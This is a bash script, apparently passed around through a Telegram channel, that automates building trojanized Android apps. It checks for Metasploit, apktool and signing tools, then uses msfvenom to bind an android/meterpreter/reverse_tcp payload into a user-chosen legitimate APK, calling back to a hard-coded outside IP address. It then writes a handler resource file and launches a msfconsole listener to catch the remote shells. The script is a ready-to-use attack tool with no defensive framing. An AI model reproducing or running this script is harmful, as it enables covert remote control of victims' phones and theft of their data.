#!/bin/bash
clear='\033[0m'
IBlack='\033[0;90m'
IRed='\033[0;91m'
IGreen='\033[0;92m'
IYellow='\033[0;93m'
IBlue='\033[0;94m'
IPurple='\033[0;95m'
ICyan='\033[0;96m'
IWhite='\033[0;97m'
echo
echo
wgeto()
{
cmta=$(which wget|grep -o wget)
if [ "$cmta" == "wget" ]; then
echo "[✅️] Installed"
else
echo "[❌️] Not-installed"
fi
}

meta()
{
met=$(which msfconsole|grep -o msfconsole)
if [ "$met" == "msfconsole" ]; then
echo "[✅️] Installed"
else
echo "[❌️] Not-installed"
fi
}

curlo()
{
cur=$(which curl|grep -o curl)
if [ "$cur" == "curl" ]; then
echo "[✅️] Installed"
else
echo "[❌️] Not-installed"
fi
}

phpto()
{
cphp=$(which php|grep -o php)
if [ "$cphp" == "php" ]; then
echo "[✅️] Installed"
else
echo "[❌️] Not-installed"
fi
}

zip()
{
zipo=$(which zip|grep -o zip)
if [ "$zipo" == "zip" ]; then
echo "[✅️] Installed"
else
echo "[❌️] Not-installed"
fi
}

unzip()
{
uzip=$(which unzip|grep -o unzip)
if [ "$uzip" == "unzip" ]; then
echo "[✅️] Installed"
else
echo "[❌️] Not-installed"
fi
}

apktoolo()
{
apktoolc=$(which apktool|grep -o apktool)
if [ "$apktoolc" == "apktool" ]; then
echo "[✅️] Installed"
else
echo "[❌️] Not-installed"
fi
}

apksignero()
{
apksignec=$(which apksigner|grep -o apksigner)
if [ "$apksignec" == "apksigner" ]; then
echo "[✅️] Installed"
else
echo "[❌️] Not-installed"
fi
}

keytoolo()
{
keytoolc=$(which keytool|grep -o keytool)
if [ "$keytoolc" == "keytool" ]; then
echo "[✅️] Installed"
else
echo "[❌️] Not-installed"
fi
}

javato()
{
javac=$(which java|grep -o java)
if [ "$javac" == "java" ]; then
echo "[✅️] Installed"
else
echo "[❌️] Not-installed"
fi
}


meta|sed 's#^#\tMetasploit is \t- #g'
curlo|sed 's#^#\tCurl is \t- #g'
wgeto|sed 's#^#\tWget is \t- #g'
phpto|sed 's#^#\tPhp is \t\t- #g'
zip|sed 's#^#\tZip is \t\t- #g'
unzip|sed 's#^#\tUnzip is \t- #g'
apktoolo|sed 's#^#\tApktool is \t- #g'
apksignero|sed 's#^#\tApksigner is \t- #g'
keytoolo|sed 's#^#\tKeytool is \t- #g'
javato|sed 's#^#\tjava is \t- #g'
echo
echo -e "${IWhite}// ${IGreen}JOIN FOR MORE${clear} ${IYellow}t.me/efxtv${clear} ${IWhite}//${clear}"

echo -en "${IBlue}[${clear}${IGreen}+${clear}${IBlue}]${clear} Please enter VPORT: ${IYellow}"
read lport

echo -e "${IBlue}[${clear}${IGreen}+${clear}${IBlue}]${clear} List of apps   PWD ${IYellow}\c"
ls $PWD|grep apk|sed 's#^#\t[+] #g'

echo -en "${IBlue}[${clear}${IGreen}+${clear}${IBlue}]${clear} App U want to bind: ${IYellow}"
read app

echo -en "${IBlue}[${clear}${IGreen}+${clear}${IBlue}]${clear} Enter output app n: ${IYellow}"
read op

echo -e "${IBlue}[${clear}${IGreen}+${clear}${IBlue}]${clear} Generating payload "
echo -e "${IBlue}[${clear}${IGreen}+${clear}${IBlue}]${clear} Please wait... "
sleep 3

#msfvenom -x $app -p android/meterpreter/reverse_tcp LHOST=193.161.193.99 LPORT=$lport -o $op
#msfvenom -x $app -a dalvik --platform android -p android/meterpreter/reverse_tcp LHOST=193.161.193.99 LPORT=$lport R> payload.apk
msfvenom -x $app -p android/meterpreter/reverse_tcp LHOST=193.161.193.99 LPORT=$lport -o $op #2> .log




echo -e "${IBlue}[${clear}${IGreen}+${clear}${IBlue}]${clear} Payload generated... "
echo -e "${IBlue}[${clear}${IGreen}+${clear}${IBlue}]${clear} Starting please wait... "
echo -e "${IBlue}[${clear}${IGreen}+${clear}${IBlue}]${clear} Copy $op to sdcard [cp $op /sdcard/] "
echo -e "${IBlue}[${clear}${IGreen}+${clear}${IBlue}]${clear} Starting metasploit listener... "
sleep 3

echo -e "# msfconsole -q -r 'export.rc'
# nano export.r
use exploit/multi/handler
set PAYLOAD android/meterpreter/reverse_tcp
set LHOST 0.0.0.0
set LPORT 5576
set ExitOnSession false
set EnableStageEncoding true
run -j" >export.rc
msfconsole -q -r 'export.rc'
